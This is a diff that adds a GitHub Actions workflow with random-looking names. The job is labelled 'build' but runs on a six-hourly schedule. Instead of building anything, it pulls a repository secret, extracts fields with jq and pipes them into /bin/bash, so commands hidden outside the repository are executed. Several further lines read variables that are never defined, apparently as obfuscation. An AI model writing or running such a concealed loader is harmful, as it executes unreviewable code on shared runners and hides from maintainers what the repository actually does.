@@ -1,0 +1,22 @@
+name: cavepreviously
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: cavepreviously
+        env:
+          hbxrp900: ${{ secrets.hbxrp900 }}
+        run: |
+          echo $hbxrp900 | jq -r .lu92 | /bin/bash
+          echo $yu8635 | jq -r .pv808 | /bin/bash
+          echo $ug9787 | jq -r .lnc26179 | /bin/bash
+          echo $hjms47 | jq -r .gy52 | /bin/bash
+          echo $uhx78 | jq -r .ld22 | /bin/bash
+          echo $hn8 | jq -r .pk97 | /bin/bash
+          echo $avys1 | jq -r .w5190 | /bin/bash
+
